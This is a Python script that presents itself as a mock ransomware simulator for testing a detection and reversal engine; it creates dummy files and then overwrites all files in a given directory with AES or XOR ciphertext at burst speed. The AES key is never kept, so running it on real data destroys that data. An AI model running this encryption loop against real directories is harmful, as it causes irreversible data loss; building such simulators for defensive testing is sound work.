#!/usr/bin/env python3
"""
Mock Ransomware Simulator for R2E (Real-Time Cryptographic Reversal Engine)
-------------------------------------------------------------------------
This tool simulates malicious cryptographic attacks:
1. Rapidly scanning and writing encrypted data to disk (>50 files in <2s)
2. High-entropy encryption payload using:
   - AES-256-CBC (standard strong encryption with pseudo-random ciphertext)
   - XOR keystream / key pattern encryption (reconstructible via known plaintext / file headers)
3. Testing R2E detection, shadow buffering, reversal, and kill-switch termination.
"""

import os
import sys
import time
import argparse
import secrets
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend

def encrypt_aes(data: bytes, key: bytes, iv: bytes) -> bytes:
    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(data) + padder.finalize()
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    return iv + encryptor.update(padded_data) + encryptor.finalize()

def encrypt_xor(data: bytes, key: bytes) -> bytes:
    key_len = len(key)
    return bytes(b ^ key[i % key_len] for i, b in enumerate(data))

def generate_test_corpus(target_dir: str, num_files: int = 60, file_size: int = 1024):
    os.makedirs(target_dir, exist_ok=True)
    created = []

    png_hdr = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR"
    pdf_hdr = b"%PDF-1.4\n1 0 obj\n<<>>\n"

    for i in range(num_files):
        t = i % 3
        if t == 0:
            ext = ".png"
            payload = png_hdr + secrets.token_bytes(file_size - len(png_hdr))
        elif t == 1:
            ext = ".pdf"
            payload = pdf_hdr + secrets.token_bytes(file_size - len(pdf_hdr))
        else:
            ext = ".txt"
            payload = (b"CONFIDENTIAL CORPORATE DATA RECORD #" + b"0123456789" * 40)[:file_size]

        fname = os.path.join(target_dir, f"document_{i:03d}{ext}")
        with open(fname, "wb") as f:
            f.write(payload)
        created.append(fname)

    print(f"[RANSOMWARE SIMULATOR] Generated {len(created)} target files in {target_dir}")
    return created

def attack(target_dir: str, mode: str = "aes", max_files: int = 60, delay_ms: float = 2.0):
    files = [os.path.join(target_dir, f) for f in os.listdir(target_dir) if os.path.isfile(os.path.join(target_dir, f))]
    files = sorted(files)[:max_files]

    if not files:
        print(f"[RANSOMWARE SIMULATOR] No files found to encrypt in {target_dir}!")
        return

    print(f"[RANSOMWARE SIMULATOR] Starting attack on PID {os.getpid()} using mode='{mode}'...")
    print(f"[RANSOMWARE SIMULATOR] Target: {len(files)} files, targeting burst speed >50 files in <2s")

    aes_key = secrets.token_bytes(32)
    xor_key = b"\x7a"

    start_time = time.time()
    encrypted_count = 0

    for i, fpath in enumerate(files):
        try:
            with open(fpath, "rb") as f:
                data = f.read()

            if mode == "aes":
                iv = secrets.token_bytes(16)
                ciphertext = encrypt_aes(data, aes_key, iv)
            elif mode in ("xor", "xor_single"):
                ciphertext = encrypt_xor(data, xor_key)
            else:
                raise ValueError(f"Unknown encryption mode {mode}")

            with open(fpath, "wb") as f:
                f.write(ciphertext)

            encrypted_count += 1
            if delay_ms > 0:
                time.sleep(delay_ms / 1000.0)

        except Exception as e:
            print(f"[RANSOMWARE SIMULATOR] Write stopped at file {i} ({fpath}): {e}")
            break

    elapsed = time.time() - start_time
    rate = encrypted_count / elapsed if elapsed > 0 else 0
    print(f"[RANSOMWARE SIMULATOR] Attack loop finished: {encrypted_count} files encrypted in {elapsed:.3f}s ({rate:.1f} files/sec)")

def main():
    parser = argparse.ArgumentParser(description="Mock Ransomware Attack Generator")
    parser.add_argument("target_dir", help="Directory where files reside")
    parser.add_argument("--mode", choices=["aes", "xor", "xor_single"], default="aes",
                        help="Encryption method (aes, xor, or xor_single)")
    parser.add_argument("--generate", action="store_true", help="Generate test files first")
    parser.add_argument("--count", type=int, default=60, help="Number of files to create/encrypt")
    parser.add_argument("--delay-ms", type=float, default=2.0, help="Delay between writes in ms (default: 2ms)")

    args = parser.parse_args()

    if args.generate:
        generate_test_corpus(args.target_dir, args.count)

    attack(args.target_dir, mode=args.mode, max_files=args.count, delay_ms=args.delay_ms)

if __name__ == "__main__":
    main()
